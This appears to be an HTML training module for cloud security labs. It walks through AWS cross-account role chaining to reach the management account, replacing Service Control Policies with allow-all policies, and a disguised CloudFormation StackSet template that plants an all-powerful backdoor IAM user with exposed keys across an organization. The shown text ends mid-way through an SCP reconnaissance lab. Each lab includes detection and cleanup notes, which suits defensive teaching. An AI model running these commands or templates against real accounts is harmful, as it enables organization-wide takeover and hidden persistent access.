@@ -1,0 +1,964 @@
+<!-- M18: Cross-Account Attack Labs -->
+
+<!-- ==================== L01 ==================== -->
+<div class="lab-walkthrough-content" id="M18-L01-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>AWS credentials with <code>iam:ListRoles</code>, <code>iam:GetRole</code> in the starting (dev) account</li>
+      <li><code>sts:AssumeRole</code> permission, or compromised credentials in an account that is trusted by the role chain</li>
+      <li>AWS CLI v2 and <code>jq</code> installed</li>
+      <li>Lab account IDs for Dev (111111111111), Staging (222222222222), Prod (333333333333), and Management (444444444444) — provided in lab portal</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Enumerate cross-account IAM trust relationships and pivot laterally through an AWS Organization from a compromised development account to the management account.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1199 — Trusted Relationship &nbsp;|&nbsp; T1098.001 — Account Manipulation: Additional Cloud Credentials</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">List all IAM roles in the current account to identify potential cross-account trust targets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table</div>
+            <div class="terminal-output">-----------------------------------------------------------
+|                       ListRoles                         |
++--------------------------+------------------------------+
+| AdminRole                | arn:aws:iam::111111111111:role/AdminRole              |
+| CrossAccountDeploy       | arn:aws:iam::111111111111:role/CrossAccountDeploy     |
+| OrganizationAccountAccessRole | arn:aws:iam::111111111111:role/OrganizationAccountAccessRole |
+| EC2ServiceRole           | arn:aws:iam::111111111111:role/EC2ServiceRole         |
+| LambdaExecRole           | arn:aws:iam::111111111111:role/LambdaExecRole         |
++--------------------------+------------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Extract and examine the trust policy (AssumeRolePolicyDocument) for every role. Filter for principals referencing external AWS account IDs.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do \
+  echo "=== $role ===" && \
+  aws iam get-role --role-name $role \
+    --query 'Role.AssumeRolePolicyDocument' 2>/dev/null; \
+done | grep -B5 -A10 '"AWS"'</div>
+            <div class="terminal-output">=== CrossAccountDeploy ===
+{
+    "Version": "2012-10-17",
+    "Statement": [{
+        "Effect": "Allow",
+        "Principal": {
+            "AWS": "arn:aws:iam::222222222222:root"
+        },
+        "Action": "sts:AssumeRole"
+    }]
+}
+=== OrganizationAccountAccessRole ===
+{
+    "Version": "2012-10-17",
+    "Statement": [{
+        "Effect": "Allow",
+        "Principal": {
+            "AWS": "arn:aws:iam::333333333333:root"
+        },
+        "Action": "sts:AssumeRole"
+    }]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Identify cross-account trust relationships by comparing principal account IDs against the current account. Map which accounts trust which.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sts get-caller-identity --query 'Account' --output text</div>
+            <div class="terminal-output">111111111111   (Dev Account)</div>
+            <div class="terminal-cmd"># Trust map discovered:</div>
+            <div class="terminal-output">111111111111 (Dev)      ← trusts → 222222222222 (Staging)
+222222222222 (Staging)  ← trusts → 333333333333 (Prod)
+333333333333 (Prod)     ← trusts → 444444444444 (Mgmt)
+Dev → Staging → Prod → Mgmt  (full chain)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Attempt to assume each cross-account role. Start with the first hop from Dev to Staging.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sts assume-role \
+  --role-arn arn:aws:iam::222222222222:role/CrossAccountDeploy \
+  --role-session-name recon</div>
+            <div class="terminal-output">{
+    "Credentials": {
+        "AccessKeyId": "ASIAQWERTYUIOP12345",
+        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+        "SessionToken": "FwoGZXIvYXdz...",
+        "Expiration": "2026-04-02T12:00:00Z"
+    },
+    "AssumedRoleUser": {
+        "Arn": "arn:aws:sts::222222222222:assumed-role/CrossAccountDeploy/recon"
+    }
+}</div>
+            <div class="terminal-cmd"># Now in Staging — verify:</div>
+            <div class="terminal-output">$ aws sts get-caller-identity
+Account: 222222222222   Role: CrossAccountDeploy</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Continue the chain — assume roles from Staging to Prod, then Prod to Management. Map the full trust graph of the organization.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Staging → Prod</div>
+            <div class="terminal-output">$ aws sts assume-role --role-arn arn:aws:iam::333333333333:role/ProdDeploy --role-session-name pivot
+→ Account: 333333333333 (Prod)</div>
+            <div class="terminal-cmd"># Prod → Management</div>
+            <div class="terminal-output">$ aws sts assume-role --role-arn arn:aws:iam::444444444444:role/OrganizationAccountAccessRole --role-session-name mgmt
+→ Account: 444444444444 (Management)
+
+$ aws organizations describe-organization
+→ MasterAccountId: 444444444444  ✓ Full org admin achieved</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Dev Account</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Enumerate trusts</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Staging</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Prod</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Mgmt Account</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CloudTrail: <code>AssumeRole</code> events where <code>sourceIdentity</code> crosses account boundaries in rapid succession (role chaining pattern)</li>
+      <li>CloudTrail: <code>AssumeRole</code> calls to <code>OrganizationAccountAccessRole</code> from any account other than the designated management tooling account</li>
+      <li>AWS IAM Access Analyzer: generates findings for roles with cross-account trust — review periodically for unexpected principals</li>
+      <li>Preventive: scope <code>OrganizationAccountAccessRole</code> trust policy to a specific principal ARN (not <code>:root</code>), and require <code>sts:ExternalId</code> or MFA conditions</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Unset assumed role credentials from your shell: <code>unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN</code></li>
+      <li>STS session credentials expire automatically (default 1 hour) — no explicit revocation needed</li>
+      <li>Review CloudTrail in all accounts traversed to confirm no unintended resources were created</li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Cross-account role chaining is the #1 way attackers move from a low-value dev account to the organization management account. Every trust relationship is a potential bridge — audit them rigorously with tools like <code>awspx</code> or <code>Cartography</code>.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L02 ==================== -->
+<div class="lab-walkthrough-content" id="M18-L02-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li><strong>Management account credentials</strong> OR credentials for an account with <code>organizations:*</code> delegated admin rights (see scenario note below)</li>
+      <li><code>organizations:ListPolicies</code>, <code>organizations:UpdatePolicy</code>, <code>organizations:CreatePolicy</code>, <code>organizations:AttachPolicy</code>, <code>organizations:DetachPolicy</code> permissions</li>
+      <li><code>organizations:ListDelegatedAdministrators</code>, <code>organizations:ListDelegatedServicesForAccount</code> — requires management account context or self-check from the delegated account</li>
+      <li>AWS CLI v2 and <code>jq</code> installed</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Bypass Service Control Policies (SCPs) by leveraging management account access (or a delegated Organizations administrator) to modify or replace organizational policies.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1484.001 — Domain or Tenant Policy Modification: Group Policy Modification &nbsp;|&nbsp; T1098.001 — Account Manipulation: Additional Cloud Credentials</div>
+  </div>
+  <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Scenario Prerequisite — SCP Management Requires Specific Permissions:</strong> SCP management requires either (a) management account credentials or (b) an account explicitly delegated for the <code>organizations</code> service administration itself. Delegated administrators for GuardDuty (<code>guardduty.amazonaws.com</code>) or Config (<code>config.amazonaws.com</code>) cannot modify SCPs — this is a common misconception. Those service delegations grant API access for <em>their specific service</em> only. In this lab scenario, the attacker has compromised the management account or obtained <code>organizations:*</code> permissions via a privilege escalation chain (e.g., via a misconfigured role in the management account discovered during the L01 role-chaining exercise).</div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">List delegated administrator accounts in the organization. These accounts have been granted permissions to manage specific AWS services on behalf of the management account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws organizations list-delegated-administrators</div>
+            <div class="terminal-output">{
+    "DelegatedAdministrators": [
+        {
+            "Id": "222222222222",
+            "Arn": "arn:aws:organizations::444444444444:account/o-abc123/222222222222",
+            "Name": "Security-Tooling",
+            "Status": "ACTIVE",
+            "DelegationEnabledDate": "2025-06-15T10:30:00Z"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Check which services the delegate account manages. Note the important distinction — only an account delegated for the <code>organizations</code> service itself can modify SCPs.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># This call requires management account context, or can be run from
+# the delegated account itself to check its own delegations:
+$ aws organizations list-delegated-services-for-account \
+  --account-id 222222222222</div>
+            <div class="terminal-output">{
+    "DelegatedServices": [
+        {
+            "ServicePrincipal": "guardduty.amazonaws.com",
+            "DelegationEnabledDate": "2025-06-15T10:30:00Z"
+        },
+        {
+            "ServicePrincipal": "config.amazonaws.com",
+            "DelegationEnabledDate": "2025-06-15T10:31:00Z"
+        }
+    ]
+}</div>
+            <div class="terminal-cmd"># These delegations (GuardDuty, Config) do NOT grant SCP modification rights.
+# SCP management requires management account credentials or
+# organizations service delegation. We proceed from management account context.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">From the management account, modify existing SCPs to remove security restrictions. Replace deny rules with a permissive allow-all policy.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws organizations list-policies --filter SERVICE_CONTROL_POLICY</div>
+            <div class="terminal-output">{
+    "Policies": [
+        {"Id": "p-restrict01", "Name": "DenyRegions", "Type": "SERVICE_CONTROL_POLICY"},
+        {"Id": "p-restrict02", "Name": "DenyRootActions", "Type": "SERVICE_CONTROL_POLICY"},
+        {"Id": "p-fullaws", "Name": "FullAWSAccess", "Type": "SERVICE_CONTROL_POLICY"}
+    ]
+}</div>
+            <div class="terminal-cmd">$ aws organizations update-policy \
+  --policy-id p-restrict01 \
+  --content file://permissive.json</div>
+            <div class="terminal-output">{
+    "Policy": {
+        "PolicySummary": {"Id": "p-restrict01", "Name": "DenyRegions"},
+        "Content": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}"
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Alternatively, create a brand new SCP that explicitly allows all actions and attach it to target accounts or OUs — overriding any deny-based SCPs.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws organizations create-policy \
+  --name "AllAccess" \
+  --type SERVICE_CONTROL_POLICY \
+  --description "Temporary maintenance policy" \
+  --content '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'</div>
+            <div class="terminal-output">{
+    "Policy": {
+        "PolicySummary": {
+            "Id": "p-newallow1",
+            "Name": "AllAccess",
+            "Type": "SERVICE_CONTROL_POLICY"
+        }
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Attach the permissive SCP to the target account or OU, then detach the restrictive policies. The target account now has no SCP guardrails.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws organizations attach-policy \
+  --policy-id p-newallow1 \
+  --target-id 333333333333</div>
+            <div class="terminal-output">{ }</div>
+            <div class="terminal-cmd">$ aws organizations detach-policy \
+  --policy-id p-restrict02 \
+  --target-id 333333333333</div>
+            <div class="terminal-output">{ }
+# Account 333333333333 now has unrestricted access — all SCP guardrails removed</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Mgmt Account Access</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">List SCPs</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Modify/Create permissive SCP</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Attach to target</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">SCP bypass complete</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CloudTrail (management account): alert on <code>organizations:UpdatePolicy</code>, <code>organizations:CreatePolicy</code>, <code>organizations:AttachPolicy</code>, and <code>organizations:DetachPolicy</code> — these should be rare and change-managed</li>
+      <li>AWS Config: the <code>org-policy-change</code> managed rule can detect SCP modifications</li>
+      <li>Preventive: require MFA for all management account API calls; restrict <code>organizations:*</code> to a dedicated break-glass role with alerting on assumption</li>
+      <li>Preventive: never grant <code>organizations</code> service delegation to accounts that do not explicitly need SCP management — GuardDuty and Config delegated admins do not need it</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Detach the permissive SCP from the target account: <code>aws organizations detach-policy --policy-id p-newallow1 --target-id 333333333333</code></li>
+      <li>Delete the permissive SCP: <code>aws organizations delete-policy --policy-id p-newallow1</code></li>
+      <li>Restore the original content of any modified SCPs (keep the original JSON content backed up before Step 3)</li>
+      <li>Re-attach any restrictive policies that were detached: <code>aws organizations attach-policy --policy-id p-restrict02 --target-id 333333333333</code></li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> SCP management is exclusively a management account capability (or explicitly delegated <code>organizations</code> admins). Treat management account credentials with the same rigor as physical datacenter access. Monitor <code>organizations:UpdatePolicy</code> and <code>organizations:CreatePolicy</code> API calls in CloudTrail.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L03 ==================== -->
+<div class="lab-walkthrough-content" id="M18-L03-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Management account credentials OR delegated admin account with <code>cloudformation:CreateStackSet</code>, <code>cloudformation:CreateStackInstances</code> permissions and <code>SERVICE_MANAGED</code> StackSet access</li>
+      <li>If running from a delegated admin account: the account must be registered as a CloudFormation delegated admin (<code>cloudformation.amazonaws.com</code>) — use <code>--call-as DELEGATED_ADMIN</code> flag</li>
+      <li><code>iam:CreateUser</code>, <code>iam:CreateAccessKey</code>, <code>iam:AttachUserPolicy</code>, <code>iam:CreatePolicy</code> in the <code>AWSCloudFormationStackSetExecutionRole</code></li>
+      <li>AWS CLI v2, <code>jq</code>, and the lab <code>backdoor.yaml</code> template (included below)</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Use CloudFormation StackSets to deploy backdoor resources across every account in an AWS Organization simultaneously.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1136.003 — Create Account: Cloud Account &nbsp;|&nbsp; T1484.001 — Domain or Tenant Policy Modification &nbsp;|&nbsp; T1098.001 — Account Manipulation: Additional Cloud Credentials</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Verify the compromised identity has StackSet administration permissions — either as a StackSet admin role or via the management account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "Account": "444444444444",
+    "Arn": "arn:aws:iam::444444444444:role/CloudFormationAdmin"
+}</div>
+            <div class="terminal-cmd">$ aws cloudformation list-stack-sets --status ACTIVE</div>
+            <div class="terminal-output">{
+    "Summaries": [
+        {"StackSetName": "baseline-config", "Status": "ACTIVE", "PermissionModel": "SERVICE_MANAGED"},
+        {"StackSetName": "security-baseline", "Status": "ACTIVE", "PermissionModel": "SERVICE_MANAGED"}
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create the malicious CloudFormation template. Note that <code>AWS::IAM::UserPolicy</code> is not a valid CloudFormation resource type — use <code>AWS::IAM::ManagedPolicy</code> with an inline <code>Users</code> reference instead. The Outputs block makes the generated access key retrievable after stack creation.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat backdoor.yaml</div>
+            <div class="terminal-output">AWSTemplateFormatVersion: '2010-09-09'
+Description: System audit compliance resources
+Resources:
+  BackdoorUser:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: svc-backup-monitor
+
+  BackdoorPolicy:
+    Type: AWS::IAM::ManagedPolicy
+    Properties:
+      ManagedPolicyName: BackdoorAccess
+      Users:
+        - !Ref BackdoorUser
+      PolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Action: '*'
+            Resource: '*'
+
+  BackdoorKey:
+    Type: AWS::IAM::AccessKey
+    Properties:
+      UserName: !Ref BackdoorUser
+
+Outputs:
+  BackdoorAccessKeyId:
+    Value: !Ref BackdoorKey
+  BackdoorSecretKey:
+    Value: !GetAtt BackdoorKey.SecretAccessKey</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Create the StackSet with service-managed permissions and auto-deployment enabled. If running from a delegated admin account, include <code>--call-as DELEGATED_ADMIN</code>.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># From management account:</div>
+            <div class="terminal-cmd">$ aws cloudformation create-stack-set \
+  --stack-set-name OrgBackdoor \
+  --template-body file://backdoor.yaml \
+  --description "Compliance audit resources" \
+  --permission-model SERVICE_MANAGED \
+  --auto-deployment Enabled=true,RetainStacksOnAccountRemoval=false \
+  --capabilities CAPABILITY_NAMED_IAM</div>
+            <div class="terminal-output">{
+    "StackSetId": "OrgBackdoor:a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+}</div>
+            <div class="terminal-cmd"># If running from a delegated admin account, add --call-as DELEGATED_ADMIN:</div>
+            <div class="terminal-cmd">$ aws cloudformation create-stack-set \
+  --stack-set-name OrgBackdoor \
+  --call-as DELEGATED_ADMIN \
+  --permission-model SERVICE_MANAGED \
+  --auto-deployment Enabled=true,RetainStacksOnAccountRemoval=false \
+  --template-body file://backdoor.yaml \
+  --capabilities CAPABILITY_NAMED_IAM</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Deploy the StackSet across all accounts in the target OU. The backdoor IAM user gets created in every single account simultaneously.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws cloudformation create-stack-instances \
+  --stack-set-name OrgBackdoor \
+  --deployment-targets OrganizationalUnitIds=ou-xxxx-yyyyyyyy \
+  --regions us-east-1 \
+  --operation-preferences MaxConcurrentPercentage=100</div>
+            <div class="terminal-output">{
+    "OperationId": "op-a1b2c3d4e5f67890"
+}</div>
+            <div class="terminal-cmd">$ aws cloudformation list-stack-instances --stack-set-name OrgBackdoor</div>
+            <div class="terminal-output">Deploying to:
+  111111111111 (Dev)      → CREATE_COMPLETE
+  222222222222 (Staging)  → CREATE_COMPLETE
+  333333333333 (Prod)     → CREATE_COMPLETE
+  555555555555 (Security) → CREATE_COMPLETE
+  ... 12 accounts total — all backdoored</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Retrieve the generated access key credentials from the StackSet Outputs, then verify admin access in any target account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Retrieve access key from the stack Outputs in Prod account:</div>
+            <div class="terminal-cmd">$ aws cloudformation describe-stacks --stack-name OrgBackdoor \
+  --query 'Stacks[0].Outputs' --output table</div>
+            <div class="terminal-output">--------------------------------------------------
+|              DescribeStacks                    |
++-----------------------+------------------------+
+| BackdoorAccessKeyId   | AKIAXXXXXXXXXXXXXXXX   |
+| BackdoorSecretKey     | wJalrXUtnFEMI/K7MDENG |
++-----------------------+------------------------+</div>
+            <div class="terminal-cmd">$ aws configure --profile backdoor-prod
+# Enter BackdoorAccessKeyId and BackdoorSecretKey from above
+
+$ aws sts get-caller-identity --profile backdoor-prod</div>
+            <div class="terminal-output">Account: 333333333333   User: svc-backup-monitor   ← Admin in Prod</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">StackSet Admin</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Malicious template</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Deploy across org</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Backdoor in every account</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CloudTrail: <code>cloudformation:CreateStackSet</code> and <code>cloudformation:CreateStackInstances</code> events — alert on any new StackSet targeting the root or broad OUs</li>
+      <li>CloudTrail (member accounts): <code>iam:CreateUser</code> and <code>iam:CreateAccessKey</code> events originating from <code>cloudformation.amazonaws.com</code> principal</li>
+      <li>AWS Config: track new IAM users with managed policies granting <code>Action: '*'</code> on <code>Resource: '*'</code></li>
+      <li>Preventive: restrict <code>cloudformation:CreateStackInstances</code> in SCPs to only approved StackSet names or specific deployment targets</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Delete all stack instances: <code>aws cloudformation delete-stack-instances --stack-set-name OrgBackdoor --deployment-targets OrganizationalUnitIds=ou-xxxx-yyyyyyyy --regions us-east-1 --no-retain-stacks</code></li>
+      <li>Wait for deletion to complete: <code>aws cloudformation describe-stack-set-operation --stack-set-name OrgBackdoor --operation-id &lt;op-id&gt;</code></li>
+      <li>Delete the StackSet: <code>aws cloudformation delete-stack-set --stack-set-name OrgBackdoor</code></li>
+      <li>Remove the AWS CLI profile: delete the <code>[backdoor-prod]</code> section from <code>~/.aws/credentials</code></li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> StackSets with service-managed permissions and auto-deployment are incredibly powerful — and dangerous. A single compromised management account can plant persistent backdoors across an entire organization in seconds. Monitor <code>cloudformation:CreateStackSet</code> and <code>cloudformation:CreateStackInstances</code> API calls.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L04 ==================== -->
+<div class="lab-walkthrough-content" id="M18-L04-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Management account credentials with <code>organizations:ListRoots</code>, <code>organizations:ListOrganizationalUnitsForParent</code>, <code>organizations:ListPolicies</code>, <code>organizations:DescribePolicy</code>, <code>organizations:ListTargetsForPolicy</code></li>
+      <li>AWS CLI v2 and <code>jq</code> installed</li>
+      <li>Familiarity with SCP policy syntax and the inheritance model (root → OU → account)</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Map the complete SCP landscape of an AWS Organization to identify security gaps, unprotected OUs, and exploitable policy misconfigurations.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1199 — Trusted Relationship &nbsp;|&nbsp; T1484.001 — Domain or Tenant Policy Modification (reconnaissance phase)</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Start from the organization root and enumerate all Organizational Units (OUs) to understand the account hierarchy.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws organizations list-roots</div>
+            <div class="terminal-output">{
+    "Roots": [{
+        "Id": "r-ab12",
+        "Arn": "arn:aws:organizations::444444444444:root/o-org123/r-ab12",
+        "Name": "Root",
+        "PolicyTypes": [{"Type": "SERVICE_CONTROL_POLICY", "Status": "ENABLED"}]
+    }]
+}</div>
+            <div class="terminal-cmd">$ aws organizations list-organizational-units-for-parent --parent-id r-ab12</div>
+            <div class="terminal-output">{
+    "OrganizationalUnits": [
+        {"Id": "ou-ab12-prod0001", "Name": "Production"},
+        {"Id": "ou-ab12-stag0001", "Name": "Staging"},
+        {"Id": "ou-ab12-dev00001", "Name": "Development"},
+        {"Id": "ou-ab12-sand0001", "Name": "Sandbox"},
+        {"Id": "ou-ab12-secr0001", "Name": "Security"}
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">List all Service Control Policies defined in the organization to understand what guardrails exist.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws organizations list-policies --filter SERVICE_CONTROL_POLICY</div>
